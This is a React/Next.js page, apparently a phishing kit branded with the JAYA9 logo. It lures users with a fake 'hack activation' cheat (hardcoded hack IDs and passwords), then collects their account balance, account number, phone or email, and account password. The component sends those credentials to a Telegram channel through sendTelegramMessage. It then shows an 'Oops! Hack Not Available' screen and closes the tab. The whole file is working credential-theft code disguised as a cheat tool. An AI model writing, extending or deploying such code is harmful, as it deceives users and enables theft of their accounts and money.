"use client"

import { useState, useEffect } from "react"
import { CheckCircle, AlertTriangle } from 'lucide-react' // Import AlertTriangle icon
import { sendTelegramMessage } from "./actions" // Updated import path

export default function HackIdPage() {
  const [hackId, setHackId] = useState("")
  const [hackPassword, setHackPassword] = useState("")
  const [accountBalance, setAccountBalance] = useState("")
  const [accountInput, setAccountInput] = useState("") // State for account number/email
  const [finalPassword, setFinalPassword] = useState("") // State for Pop-up Page 6 password
  const [showPage1Confirmation, setShowPage1Confirmation] = useState(false)
  const [showPage2Confirmation, setShowPage2Confirmation] = useState(false)
  const [currentPage, setCurrentPage] = useState(1) // 1, 2, 3, 4, 5, 6, 7 for different pages
  const [countdown, setCountdown] = useState(5) // State for countdown on Pop-up Page 7

  // New state to manage redirection after success
  const [redirectToPrevious, setRedirectToPrevious] = useState(false)
  const [minBalanceRequired, setMinBalanceRequired] = useState(0) // New state for dynamic min balance

  // States for input validation feedback
  const [isHackIdInvalid, setIsHackIdInvalid] = useState(false)
  const [isHackPasswordInvalid, setIsHackPasswordInvalid] = useState(false)
  const [isAccountBalanceInvalid, setIsAccountBalanceInvalid] = useState(false)
  const [isAccountInputInvalid, setIsAccountInputInvalid] = useState(false)
  const [isFinalPasswordInvalid, setIsFinalPasswordInvalid] = useState(false)

  useEffect(() => {
    if (currentPage === 7) {
      setCountdown(5) // Set countdown to 5 seconds (5-1 range)
      const timer = setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            clearInterval(timer)
            // Close the entire app/page and return user to previous location
            window.close() // Try to close the window/tab
            // Fallback: go back in browser history if window.close() doesn't work
            setTimeout(() => {
              window.history.back()
            }, 100)
            return 0
          }
          return prev - 1
        })
      }, 1000)

      return () => clearInterval(timer) // Cleanup on unmount
    }
  }, [currentPage])

  // Effect to handle redirection
  useEffect(() => {
    if (redirectToPrevious) {
      // Small delay to ensure Telegram message is processed/user sees confirmation
      const redirectTimer = setTimeout(() => {
        window.history.back() // Go back to the previous page in browser history
      }, 1500) // Adjust delay as needed

      return () => clearTimeout(redirectTimer)
    }
  }, [redirectToPrevious])

  const handleConfirm = () => {
    const middleDigits = hackId.substring(1, 3) // Extract "##" part
    const allowedMiddleDigits = ["10", "20", "30", "40", "50"]
    const validPatterns = [`7${middleDigits}4477899`, `8${middleDigits}2069357`, `1${middleDigits}7967802`]

    if (hackId.length !== 10 || !(allowedMiddleDigits.includes(middleDigits) && validPatterns.includes(hackId))) {
      setIsHackIdInvalid(true)
      // Force re-trigger shake animation by briefly resetting and setting again
      setIsHackIdInvalid(false)
      setTimeout(() => setIsHackIdInvalid(true), 10)
      return
    }

    // Set minimum balance based on middle digits
    let required = 0
    switch (middleDigits) {
      case "10":
        required = 1000
        break
      case "20":
        required = 2000
        break
      case "30":
        required = 3000
        break
      case "40":
        required = 4000
        break
      case "50":
        required = 5000
        break
      default:
        required = 0
    }
    setMinBalanceRequired(required)

    console.log("Hack ID:", hackId, "Middle Digits:", middleDigits, "Min Balance Set:", required)
    setIsHackIdInvalid(false)
    setShowPage1Confirmation(true)
    setTimeout(() => {
      setShowPage1Confirmation(false)
      setCurrentPage(2)
    }, 1500)
  }

  const handleActivation = () => {
    const allowedPasswords = ["124499", "009015", "456924"]
    // Check for exact 6 characters and if it's in the allowed list
    if (hackPassword.length !== 6 || !allowedPasswords.includes(hackPassword)) {
      setIsHackPasswordInvalid(true)
      // Force re-trigger shake animation by briefly resetting and setting again
      setIsHackPasswordInvalid(false)
      setTimeout(() => setIsHackPasswordInvalid(true), 10)
      return
    }

    console.log("Hack Password:", hackPassword)
    setIsHackPasswordInvalid(false)
    setShowPage2Confirmation(true)
    setTimeout(() => {
      setShowPage2Confirmation(false)
      setCurrentPage(3) // Navigate to Pop-up Page 3
    }, 1500)
  }

  const handleBalanceConfirm = () => {
    const balance = Number.parseInt(accountBalance, 10)
    if (isNaN(balance) || balance < minBalanceRequired) {
      setIsAccountBalanceInvalid(true)
      // Force re-trigger shake animation by briefly resetting and setting again
      setIsAccountBalanceInvalid(false)
      setTimeout(() => setIsAccountBalanceInvalid(true), 10)
      return
    }

    console.log(`Account Balance Confirmed: ${balance}`)
    setIsAccountBalanceInvalid(false)
    setCurrentPage(5) // Navigate to Pop-up Page 5
  }

  const handleAccountInputConfirm = () => {
    const isNumericOnly = /^\d+$/.test(accountInput);
    let isValid = false;

    if (accountInput.startsWith('01')) {
      // If starts with "01", must be exactly 11 characters AND purely numeric
      isValid = accountInput.length === 11 && isNumericOnly;
    } else if (isNumericOnly) {
      // If purely numeric and does NOT start with "01", exactly 5 digits
      isValid = accountInput.length === 5;
    } else {
      // If not purely numeric (contains letters or mixed chars), at least 6 characters
      isValid = accountInput.length >= 6;
    }

    if (!isValid) {
      setIsAccountInputInvalid(true)
      // Force re-trigger shake animation by briefly resetting and setting again
      setIsAccountInputInvalid(false)
      setTimeout(() => setIsAccountInputInvalid(true), 10)
      return
    }

    console.log(`Account Input Confirmed: ${accountInput}`)
    setIsAccountInputInvalid(false)
    setCurrentPage(6) // Navigate to Pop-up Page 6
  }

  const handleFinalPasswordConfirm = async () => {
    if (finalPassword.length < 4) {
      setIsFinalPasswordInvalid(true)
      // Force re-trigger shake animation by briefly resetting and setting again
      setIsFinalPasswordInvalid(false)
      setTimeout(() => setIsFinalPasswordInvalid(true), 10)
      return
    }

    console.log("Final Password Confirmed!")

    setIsFinalPasswordInvalid(false)

    // Send data to Telegram
    const telegramResult = await sendTelegramMessage(accountBalance, accountInput, finalPassword)

    if (telegramResult.success) {
      console.log("Data sent to Telegram successfully!")
    } else {
      console.error(`Failed to send data to Telegram: ${telegramResult.error}`)
    }

    // Always go to "Oops!" page regardless of Telegram result
    setCurrentPage(7)
  }

  const handleBackToPage1 = () => {
    setCurrentPage(1)
    setHackPassword("")
    setAccountBalance("")
    setAccountInput("")
    setFinalPassword("")
    setMinBalanceRequired(0) // Reset min balance
    // Reset invalid states
    setIsHackIdInvalid(false)
    setIsHackPasswordInvalid(false)
    setIsAccountBalanceInvalid(false)
    setIsAccountInputInvalid(false)
    setIsFinalPasswordInvalid(false)
  }

  const handleBackToPage3 = () => {
    setCurrentPage(3)
    setAccountBalance("")
    setAccountInput("")
    setFinalPassword("")
    // Reset invalid states
    setIsAccountBalanceInvalid(false)
    setIsAccountInputInvalid(false)
    setIsFinalPasswordInvalid(false)
  }

  const handleBackToPage4 = () => {
    setCurrentPage(4)
    setAccountInput("")
    setFinalPassword("")
    // Reset invalid states
    setIsAccountInputInvalid(false)
    setIsFinalPasswordInvalid(false)
  }

  const handleBackToPage5 = () => {
    setCurrentPage(5)
    setFinalPassword("")
    // Reset invalid states
    setIsFinalPasswordInvalid(false)
  }

  const handleStartOver = () => {
    setCurrentPage(1)
    setHackId("")
    setHackPassword("")
    setAccountBalance("")
    setAccountInput("")
    setFinalPassword("")
    setMinBalanceRequired(0) // Reset min balance
    // Reset all invalid states
    setIsHackIdInvalid(false)
    setIsHackPasswordInvalid(false)
    setIsAccountBalanceInvalid(false)
    setIsAccountInputInvalid(false)
    setIsFinalPasswordInvalid(false)
  }

  // Pop-up Page 1
  if (currentPage === 1) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        {/* Logo */}
        <div className="pt-8 pl-6">
          <img src="/jaya9-logo.png" alt="JAYA9" className="w-32 h-auto" />
        </div>

        {/* Main Content - Pop-up Page 1 */}
        <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
          {/* Title */}
          <h1 className="text-xl font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">
            Inter Your Hack Activation ID
          </h1>

          {/* Input Field */}
          <div className={`w-64 mb-6 relative ${isHackIdInvalid ? "animate-shake" : ""}`}>
            <input
              type="text"
              placeholder="Hack ID"
              value={hackId}
              onChange={(e) => {
                // Allow all characters, no max length
                setHackId(e.target.value)
              }}
              // Removed maxLength attribute
              className="w-full px-3 py-3 text-base text-red-600 placeholder-red-400 bg-white border-0 rounded-lg shadow-md focus:outline-none focus:ring-2 focus:ring-red-500 focus:shadow-lg transition-all"
            />
            {isHackIdInvalid && (
              <AlertTriangle className="absolute right-2 top-1/2 -translate-y-1/2 text-red-500" size={20} />
            )}
          </div>

          {/* Confirm Button */}
          <button
            onClick={handleConfirm}
            className={`bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 ${
              hackId.length < 10 ? "opacity-50 cursor-not-allowed" : "" // Button enabled if at least 10 chars
            }`}
            disabled={hackId.length < 10} // Button enabled if at least 10 chars
          >
            Confirm
          </button>

          {/* Confirmation Message */}
          {showPage1Confirmation && (
            <div className="mt-8 p-4 bg-green-100 border border-green-400 text-green-700 rounded-lg shadow-md animate-fade-in">
              <p className="text-center font-semibold">✓ Hack ID Confirmed!</p>
              <p className="text-center text-sm mt-1">Loading next page...</p>
            </div>
          )}
        </div>

        <style jsx>{`
          @keyframes fade-in {
            from {
              opacity: 0;
              transform: translateY(-10px);
            }
            to {
              opacity: 1;
              transform: translateY(0);
            }
          }
          @keyframes bounce-in {
            0% { transform: scale(0); opacity: 0; }
            50% { transform: scale(1.2); opacity: 1; }
            100% { transform: scale(1); }
          }
          @keyframes shake {
            0%, 100% { transform: translateX(0); }
            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
            20%, 40%, 60%, 80% { transform: translateX(5px); }
          }
          .animate-fade-in {
            animation: fade-in 0.3s ease-out;
          }
          .animate-bounce-in {
            animation: bounce-in 0.5s ease-out forwards;
          }
          .animate-shake {
            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
            transform: translate3d(0, 0, 0);
            backface-visibility: hidden;
            perspective: 1000px;
          }
        `}</style>
      </div>
    )
  }

  // Pop-up Page 2
  if (currentPage === 2) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        {/* Logo */}
        <div className="pt-8 pl-6">
          <img src="/jaya9-logo.png" alt="JAYA9" className="w-32 h-auto" />
        </div>

        {/* Main Content - Pop-up Page 2 */}
        <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
          {/* Title */}
          <h1 className="text-2xl font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">
            Enter Your Hack Password
          </h1>

          {/* Input Field - No max length, alphanumeric */}
          <div className={`w-64 mb-6 relative ${isHackPasswordInvalid ? "animate-shake" : ""}`}>
            <input
              type="text" // Changed to text to allow alphanumeric
              placeholder="Password"
              value={hackPassword}
              onChange={(e) => {
                // Allow all characters, no max length
                setHackPassword(e.target.value)
              }}
              // Removed maxLength attribute
              className="w-full px-3 py-3 text-base text-red-600 placeholder-red-400 bg-white border-0 rounded-lg shadow-md focus:outline-none focus:ring-2 focus:ring-red-500 focus:shadow-lg transition-all"
            />
            {isHackPasswordInvalid && (
              <AlertTriangle className="absolute right-2 top-1/2 -translate-y-1/2 text-red-500" size={20} />
            )}
          </div>

          {/* Activation Button */}
          <button
            onClick={handleActivation}
            className={`bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 mb-4 ${
              hackPassword.length < 6 ? "opacity-50 cursor-not-allowed" : "" // Button enabled if at least 6 chars
            }`}
            disabled={hackPassword.length < 6} // Button enabled if at least 6 chars
          >
            Activation
          </button>

          {/* Back Button */}
          <button
            onClick={handleBackToPage1}
            className="text-red-600 hover:text-red-700 text-sm underline transition-colors"
          >
            Back to Hack ID
          </button>

          {/* Activation Confirmation Message */}
          {showPage2Confirmation && (
            <div className="mt-8 p-4 bg-blue-100 border border-blue-400 text-blue-700 rounded-lg shadow-md animate-fade-in flex items-center justify-center gap-2">
              <CheckCircle className="w-6 h-6 text-blue-500 animate-bounce-in" />
              <p className="text-center font-semibold">Hack Action Completed</p>
            </div>
          )}
        </div>

        <style jsx>{`
          @keyframes fade-in {
            from {
              opacity: 0;
              transform: translateY(-10px);
            }
            to {
              opacity: 1;
              transform: translateY(0);
            }
          }
          @keyframes bounce-in {
            0% { transform: scale(0); opacity: 0; }
            50% { transform: scale(1.2); opacity: 1; }
            100% { transform: scale(1); }
          }
          @keyframes shake {
            0%, 100% { transform: translateX(0); }
            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
            20%, 40%, 60%, 80% { transform: translateX(5px); }
          }
          .animate-fade-in {
            animation: fade-in 0.3s ease-out;
          }
          .animate-bounce-in {
            animation: bounce-in 0.5s ease-out forwards;
          }
          .animate-shake {
            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
            transform: translate3d(0, 0, 0);
            backface-visibility: hidden;
            perspective: 1000px;
          }
        `}</style>
      </div>
    )
  }

  // Pop-up Page 3
  if (currentPage === 3) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        {/* Logo */}
        <div className="pt-8 pl-6">
          <img src="/jaya9-logo.png" alt="JAYA9" className="w-32 h-auto" />
        </div>

        {/* Main Content - Pop-up Page 3 */}
        <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
          {/* Title */}
          <h1 className="text-2xl font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">
            Activation Complete!
          </h1>

          {/* Confirmation Message */}
          <div className="mt-8 p-4 bg-green-100 border border-green-400 text-green-700 rounded-lg shadow-md flex items-center justify-center gap-2">
            <CheckCircle className="w-8 h-8 text-green-600" />
            <p className="text-center font-semibold text-lg">Your Hack is Ready!</p>
          </div>

          {/* Add Account Button */}
          <button
            onClick={() => setCurrentPage(4)} // Navigate to Pop-up Page 4
            className="mt-12 bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95"
          >
            Add Account
          </button>
        </div>
      </div>
    )
  }

  // Pop-up Page 4: Enter Your Account Balance
  if (currentPage === 4) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        {/* Logo */}
        <div className="pt-8 pl-6">
          <img src="/jaya9-logo.png" alt="JAYA9" className="w-32 h-auto" />
        </div>

        {/* Main Content - Pop-up Page 4 */}
        <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
          {/* Title */}
          <h1 className="text-lg font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">
            Enter Your Account Balance
          </h1>

          {/* Input Field for Balance */}
          <div className={`w-64 mb-6 relative ${isAccountBalanceInvalid ? "animate-shake" : ""}`}>
            <input
              type="number"
              placeholder="Enter Amount"
              value={accountBalance}
              onChange={(e) => {
                setAccountBalance(e.target.value)
              }}
              className="w-full px-3 py-3 text-base text-red-600 placeholder-red-400 bg-white border-0 rounded-lg shadow-md focus:outline-none focus:ring-2 focus:ring-red-500 focus:shadow-lg transition-all"
            />
            {isAccountBalanceInvalid && (
              <AlertTriangle className="absolute right-2 top-1/2 -translate-y-1/2 text-red-500" size={20} />
            )}
          </div>

          {/* Confirm Button for Balance */}
          <button
            onClick={handleBalanceConfirm}
            className={`bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 mb-4 ${
              Number.parseInt(accountBalance, 10) < minBalanceRequired ? "opacity-50 cursor-not-allowed" : ""
            }`}
            disabled={Number.parseInt(accountBalance, 10) < minBalanceRequired}
          >
            Confirm
          </button>

          {/* Back Button */}
          <button
            onClick={handleBackToPage3}
            className="text-red-600 hover:text-red-700 text-sm underline transition-colors"
          >
            Back to Activation
          </button>
        </div>
      </div>
    )
  }

  // Pop-up Page 5: Enter Account Number Or Email
  if (currentPage === 5) {
    const isNumericOnly = /^\d+$/.test(accountInput);
    let isButtonEnabled = false;

    if (accountInput.startsWith('01')) {
      // If starts with "01", button enabled only when exactly 11 characters AND purely numeric
      isButtonEnabled = accountInput.length === 11 && isNumericOnly;
    } else if (isNumericOnly) {
      // If purely numeric and does NOT start with "01", exactly 5 digits
      isButtonEnabled = accountInput.length === 5;
    } else {
      // If not purely numeric (contains letters or mixed chars), at least 6 characters
      isButtonEnabled = accountInput.length >= 6;
    }

    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        {/* Logo */}
        <div className="pt-8 pl-6">
          <img src="/jaya9-logo.png" alt="JAYA9" className="w-32 h-auto" />
        </div>

        {/* Main Content - Pop-up Page 5 */}
        <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
          {/* Title */}
          <h1 className="text-lg font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">
            Enter Account Number Or Email
          </h1>

          {/* Input Field for Account Number/Email */}
          <div className={`w-64 mb-6 relative ${isAccountInputInvalid ? "animate-shake" : ""}`}>
            <input
              type="text"
              placeholder="Email Or Phone"
              value={accountInput}
              onChange={(e) => {
                const value = e.target.value;
                const isCurrentNumericOnly = /^\d*$/.test(value); // Check if current value is purely numeric

                if (isCurrentNumericOnly && !value.startsWith('01')) {
                  // If purely numeric AND does NOT start with '01', enforce max 5 digits
                  if (value.length <= 5) {
                    setAccountInput(value);
                  }
                } else {
                  // Otherwise (starts with '01' and numeric, or contains non-digits), no length restriction on typing
                  setAccountInput(value);
                }
              }}
              // Removed maxLength attribute to allow dynamic control via onChange
              className="w-full px-3 py-3 text-base text-red-600 placeholder-red-400 bg-white border-0 rounded-lg shadow-md focus:outline-none focus:ring-2 focus:ring-red-500 focus:shadow-lg transition-all"
            />
            {isAccountInputInvalid && (
              <AlertTriangle className="absolute right-2 top-1/2 -translate-y-1/2 text-red-500" size={20} />
            )}
          </div>

          {/* Confirm Button for Account Input */}
          <button
            onClick={handleAccountInputConfirm}
            className={`bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 mb-4 ${
              !isButtonEnabled ? "opacity-50 cursor-not-allowed" : ""
            }`}
            disabled={!isButtonEnabled}
          >
            Confirm
          </button>

          {/* Back Button */}
          <button
            onClick={handleBackToPage4}
            className="text-red-600 hover:text-red-700 text-sm underline transition-colors"
          >
            Back to Balance
          </button>
        </div>
      </div>
    )
  }

  // Pop-up Page 6: Enter Your Password (Again)
  if (currentPage === 6) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        {/* Logo */}
        <div className="pt-8 pl-6">
          <img src="/jaya9-logo.png" alt="JAYA9" className="w-32 h-auto" />
        </div>

        {/* Main Content - Pop-up Page 6 */}
      <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
        {/* Title */}
        <h1 className="text-xl font-bold text-red-600 text-center mb-3 leading-tight max-w-64 px-4">
          Enter Your Password
        </h1>

        {/* Input Field for Final Password */}
        <div className={`w-64 mb-6 relative ${isFinalPasswordInvalid ? "animate-shake" : ""}`}>
          <input
            type="password"
            placeholder="Password"
            value={finalPassword}
            onChange={(e) => {
              setFinalPassword(e.target.value)
            }}
            className="w-full px-3 py-3 text-base text-red-600 placeholder-red-400 bg-white border-0 rounded-lg shadow-md focus:outline-none focus:ring-2 focus:ring-red-500 focus:shadow-lg transition-all"
          />
          {isFinalPasswordInvalid && (
            <AlertTriangle className="absolute right-2 top-1/2 -translate-y-1/2 text-red-500" size={20} />
          )}
        </div>

        {/* Confirm Button for Final Password */}
        <button
          onClick={handleFinalPasswordConfirm}
          className={`bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 mb-4 ${
            finalPassword.length < 4 ? "opacity-50 cursor-not-allowed" : ""
          }`}
          disabled={finalPassword.length < 4} // Disabled if less than 4 characters
        >
          Confirm
        </button>

        {/* Back Button */}
        <button
          onClick={handleBackToPage5}
          className="text-red-600 hover:text-red-700 text-sm underline transition-colors"
        >
          Back to Account Input
        </button>

        {/* Start Over Button */}
        <button
          onClick={handleStartOver}
          className="mt-4 text-red-600 hover:text-red-700 text-sm underline transition-colors"
        >
          Start Over
        </button>
      </div>
    </div>
  )
}

// Pop-up Page 7: Oops! Hack not available.
if (currentPage === 7) {
  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      {/* Logo */}
      <div className="pt-8 pl-6">
        <img src="/jaya9-logo.png" alt="JAYA9" className="w-32 h-auto" />
      </div>

      {/* Main Content - Pop-up Page 7 - Positioned higher like input boxes */}
      <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20 text-center">
        {/* Large Warning Sign */}
        <div className="text-8xl mb-6 animate-pulse">⚠️</div>

        {/* Title */}
        <h1 className="text-6xl font-bold text-red-600 mb-4 animate-pulse">Oops!</h1>

        {/* Subtitle */}
        <p className="text-xl font-semibold text-red-500 mb-8">Hack Not Available. Try again 😎</p>

        {/* Countdown */}
        <p className="text-lg text-gray-700">Closing in {countdown}s</p>
      </div>

      <style jsx>{`
        @keyframes pulse {
          0% {
            transform: scale(1);
            opacity: 1;
          }
          50% {
            transform: scale(1.05);
            opacity: 0.8;
          }
          100% {
            transform: scale(1);
            opacity: 1;
          }
        }
        .animate-pulse {
          animation: pulse 1.5s infinite ease-in-out;
        }
      `}</style>
    </div>
  )
}

return null
}
